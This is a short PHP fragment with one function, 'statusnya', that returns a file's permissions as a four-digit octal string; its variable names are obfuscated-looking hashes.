function statusnya($i_367af3ad) {
    $e_203916a2 = substr(sprintf("%o", fileperms($i_367af3ad)), -4);
    return $e_203916a2;
}
?>